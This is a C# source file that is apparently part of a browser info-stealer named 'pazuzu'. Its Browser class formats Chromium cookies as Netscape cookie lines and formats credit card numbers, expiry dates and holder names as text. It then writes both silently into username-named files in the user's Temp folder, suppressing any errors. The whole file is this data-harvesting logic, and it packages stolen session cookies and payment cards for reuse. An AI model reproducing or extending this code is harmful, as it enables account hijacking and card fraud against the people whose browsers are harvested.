using System;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.ChromiumBased;

internal class Browser
{
	private static string FormatCookie(Common.CCookie ccookie)
	{
		return $"{ccookie.hostname}\tTRUE\t{ccookie.path}\tFALSE\t{ccookie.expiresutc}\t{ccookie.name}\t{ccookie.value}\r\n";
	}

	private static string FormatCreditCard(Common.CreditCard cc)
	{
		return string.Format("Number: {0}\nExp: {1}\nHolder: {2}\n\n", cc.number, cc.expmonth + "/" + cc.expyear, cc.name);
	}

	public static bool ShowCookies(List<Common.CCookie> CCookies)
	{
		string userName = Environment.UserName;
		string path = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCookies.txt";
		try
		{
			foreach (Common.CCookie CCookie in CCookies)
			{
				using StreamWriter streamWriter = File.AppendText(path);
				streamWriter.WriteLine(FormatCookie(CCookie));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool ShowCreditCards(List<Common.CreditCard> CreditCards)
	{
		string userName = Environment.UserName;
		string path = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCards.txt";
		try
		{
			foreach (Common.CreditCard CreditCard in CreditCards)
			{
				using StreamWriter streamWriter = File.AppendText(path);
				streamWriter.WriteLine(FormatCreditCard(CreditCard));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}
}
